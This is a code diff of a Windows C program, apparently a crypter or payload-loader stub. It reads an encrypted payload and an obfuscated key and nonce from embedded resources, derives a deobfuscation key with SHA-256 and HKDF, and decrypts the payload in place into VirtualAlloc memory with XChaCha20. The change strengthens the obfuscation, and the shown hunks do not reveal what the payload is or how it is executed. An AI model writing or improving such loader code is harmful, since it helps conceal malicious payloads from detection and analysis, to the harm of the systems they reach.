@@ -37,14 +37,19 @@ int main()
     uint8_t key[32] = {0};
     uint8_t nonce[24] = {0};
 
+
     /*
-    1) Getting payload and obfuscated key & nonce from resources
-    2) Calculating hash of the payload (used as obfuscation key)
-    3) Chacha20 ctx init
-    4) Deobfuscating key and nonce 
-    5) Copying encrypted payload to allocated buffer
-    6) Initializing ChaCha20-Poly1305 context for decryption with real key and nonce
-    7) Decrypting the payload in-place
+    Payload decryption and key/nonce recovery process:
+    
+    1) Load encrypted payload and obfuscated key & nonce from embedded resources.
+    2) Calculate SHA-256 hash of the encrypted payload.
+    3) Extract first 16 bytes of the hash to be used as HKDF salt.
+    4) Use HKDF with hash and salt to derive 80 bytes of keying material (OKM).
+        - First 32 bytes → key for deobfuscating real key and nonce.
+        - Last 24 bytes  → nonce for deobfuscation context.
+    5) Initialize XChaCha20 context and decrypt the obfuscated key and nonce.
+    6) Allocate memory and copy the encrypted payload.
+    7) Initialize XChaCha20 context with real key/nonce and decrypt the payload in-place.
     */
 
     unsigned long payloadSize = 0, keySize = 0, nonceSize = 0;
@@ -59,24 +64,47 @@ int main()
         return 1;
     }
 
+    // 1) Compute SHA256 of encrypted payload
     uint8_t hash[32];
     SHA256Context shaCtx;
     SHA256Reset(&shaCtx);
     SHA256Input(&shaCtx, payloadResPtr, payloadSize);
     SHA256Result(&shaCtx, hash);
 
+    // 2) salt = hash[0..15]
+    uint8_t salt[16];
+    memcpy(salt, hash, 16);
+
+    // 3) HKDF(salt, IKM=hash) → okm[80]
+    HKDFContext hkdfCTX;
+    uint8_t prk[USHAMaxHashSize];
+    uint8_t okm[80];
+    uint8_t metaNonce[24];
+    uint8_t obfKey[32];
+    uint8_t obfNonce[24];
+    
+    memset(&hkdfCTX, 0, sizeof(hkdfCTX));
+    if (hkdfReset(&hkdfCTX, SHA256, salt, 16) != 0 ||
+        hkdfInput(&hkdfCTX, hash, 32) != 0 ||
+        hkdfResult(&hkdfCTX, prk, (const uint8_t *)"obfuscation-context", (int)strlen("obfuscation-context"), okm, 80) != 0)
+    {
+        return 1;
+    }
+    memcpy(obfKey, okm, 32);
+    memcpy(metaNonce, okm + 56, 24);
+
+    // 4) Decrypt obfuscated key and nonce using obfKey/metaNonce
     chacha20poly1305_ctx obfCtx;
-    xchacha20poly1305_init(&obfCtx, hash, (uint8_t *)"obfuscation-nonce-12224");
+    xchacha20poly1305_init(&obfCtx, obfKey, metaNonce);
     chacha20poly1305_decrypt(&obfCtx, obfKeyPtr, key, 32);
     chacha20poly1305_decrypt(&obfCtx, obfNoncePtr, nonce, 24);
 
+    // 5) Decrypt the payload
     uint8_t* decrypted = (uint8_t*)VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!decrypted) {
         return 1;
     }
-
     memcpy(decrypted, payloadResPtr, payloadSize);
-
     chacha20poly1305_ctx decCtx;
     xchacha20poly1305_init(&decCtx, key, nonce);
     chacha20poly1305_decrypt(&decCtx, decrypted, decrypted, payloadSize);
@@ -164,6 +192,13 @@ int main()
         }
     }
 
-    VirtualFree(decrypted, 0, MEM_RELEASE);
+    SecureZeroMemory(key, sizeof(key));
+    SecureZeroMemory(nonce, sizeof(nonce));
+
+    if (decrypted)
+    {
+        SecureZeroMemory(decrypted, payloadSize);
+        VirtualFree(decrypted, 0, MEM_RELEASE);
+    }
     return 1;
 }
